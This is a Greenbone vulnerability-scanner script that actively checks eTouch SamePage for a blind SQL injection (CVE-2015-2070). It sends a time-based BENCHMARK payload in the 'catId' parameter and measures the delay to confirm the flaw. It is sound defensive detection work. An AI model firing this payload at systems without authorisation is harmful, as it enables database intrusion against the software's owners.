# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805152");
  script_version("2023-08-25T16:09:51+0000");
  script_tag(name:"last_modification", value:"2023-08-25 16:09:51 +0000 (Fri, 25 Aug 2023)");
  script_tag(name:"creation_date", value:"2015-03-16 16:36:52 +0530 (Mon, 16 Mar 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2015-2070");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("eTouch SamePage <= 4.4.0.0.239 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 18080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"eTouch SamePage is prone to a blind SQL injection (SQLi)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The /cm/blogrss/feed script does not properly sanitizing
  user-supplied input to the 'catId' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or
  manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of
  arbitrary data.");

  script_tag(name:"affected", value:"eTouch SamePage Enterprise Edition version 4.4.0.0.239 and
  probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36089");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130386");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Feb/47");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

wait_extra_sec = 5;

port = http_get_port(default: 18080);

foreach dir (make_list_unique("/", "/samepage", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/cm/newui/wiki/index.jsp");

  if (">SamePage" >< res && ">Dashboard<" >< res) {
    ## Added three times, to make sure its working properly
    sleep = make_list(15000000, 25000000);

    ## Use sleep time to check we are able to execute command
    foreach sec (sleep) {
      url = dir + "/cm/blogrss/feed?entity=mostviewedpost&analyticsType=blog&catId=-1)" +
            "%20AND%202345=BENCHMARK(" + sec + ",MD5(0x6b4e6459))%20AND%20(4924=" +
            "4924&count=10&et_cw=850&et_ch=600";

      req = http_get(port: port, item: url);

      start = unixtime();
      res = http_keepalive_send_recv(port: port, data: req);
      stop = unixtime();

      time_taken = stop - start;
      sec = sec / 5000000;

      if (time_taken + 1 < sec || time_taken > (sec + wait_extra_sec))
        exit(0);
    }

    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
